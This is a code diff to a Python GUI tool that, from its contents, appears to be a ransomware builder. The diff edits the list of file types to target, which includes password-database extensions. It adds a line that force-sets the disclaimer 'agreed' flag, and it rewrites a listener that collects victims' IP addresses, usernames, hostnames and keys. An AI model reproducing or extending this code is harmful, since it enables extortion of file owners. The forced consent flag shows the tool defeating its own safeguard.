@@ -39,7 +39,7 @@ but can easily be coded into it as a nice feature.
 __author__ = "Leon Voerman"
 __copyright__ = "Copyright 2019, Incoming Security"
 __license__ = "GPLv3"
-__version__ = "1.2.1"
+__version__ = "1.2.2"
 __maintainer__ = "Leon Voerman"
 __email__ = "I don't need spam, open an issue on GitHub, thank you :)"
 __status__ = "Production"
@@ -179,7 +179,7 @@ class MainWindow(Tk):
         }
 
 
-        #<activate>
+        self.options['agreed'].set(1)
         #<activate>
 
         if not self.options['agreed'].get() == 1:
@@ -224,7 +224,6 @@ kdbx
 kdb
 mp4
 flv
-ini
 iso
 zip
 tar
@@ -800,8 +799,7 @@ vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC''')
 
     def start_thread(self):
         # Start server as thread
-        thread = threading.Thread(target=self.start_server)
-        thread.daemon = True
+        thread = threading.Thread(target=self.start_server, daemon = True)
         thread.start()
 
     def start_server(self):
@@ -810,38 +808,29 @@ vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC''')
         socket_list = []
 
         server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         server_socket.bind((host, port))
-        server_socket.listen(10)
-
-        # add server socket object to the list of readable connections
-        socket_list.append(server_socket)
+        server_socket.listen(1)
 
         self.insert_banner()
         self.serv.options['log'].insert('1.0', "Server started on port [%s] [%s]\nWaiting...\n" % (host, int(port)), 'deeppink')
 
         try:
             while True:
-                ready_to_read,ready_to_write,in_error = select.select(socket_list,[],[],0)
+                sockfd, addr = server_socket.accept()
+                try:
+                    while True:
+                        data = sockfd.recv(1024)
+                        if data:
+                            print(data)
+                            data = data.decode('UTF-8')
+                            ip = addr[0]
+                            local = data.split('$')[0]
+                            system = data.split('$')[1]
+                            key = data.split('$')[2].strip()[2:].strip()[:-1]
+                            user = data.split('$')[3]
+                            hostname = data.split('$')[4]
 
-                for sock in ready_to_read:
-                    # a new connection request recieved
-                    if sock == server_socket:
-                        sockfd, addr = server_socket.accept()
-                        socket_list.append(sockfd)
-                    else:
-                        try:
-                            data = sock.recv(1024)
-                            if data:
-                                data = data.decode('UTF-8')
-                                ip = addr[0]
-                                local = data.split('$')[0]
-                                system = data.split('$')[1]
-                                key = data.split('$')[2].strip()[2:].strip()[:-1]
-                                user = data.split('$')[3]
-                                hostname = data.split('$')[4]
-
-                                result = '''
+                            result = '''
 [Occured]    -> %s %s
 [Username]   -> %s
 [Remote IP]  -> %s
@@ -852,15 +841,17 @@ vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC''')
 
 ''' % (time.strftime('%d/%m/%Y'), time.strftime('%X'), user, ip, local, system, hostname, key)
 
-                                self.serv.options['log'].insert(END, result, 'yellow')
-                                self.serv.options['log'].see(END)
+                            self.serv.options['log'].insert(END, result, 'yellow')
+                            self.serv.options['log'].see(END)
 
-                            else:
-                                if sock in socket_list:
-                                    socket_list.remove(sock)
-                        except Exception as e:
-                            print(e)
-                            continue
+                        else:
+                            break
+
+                except Exception as e:
+                    print(e)
+                finally:
+                    sockfd.close()
+
         except KeyboardInterrupt:
             print('Closed...\n')
 
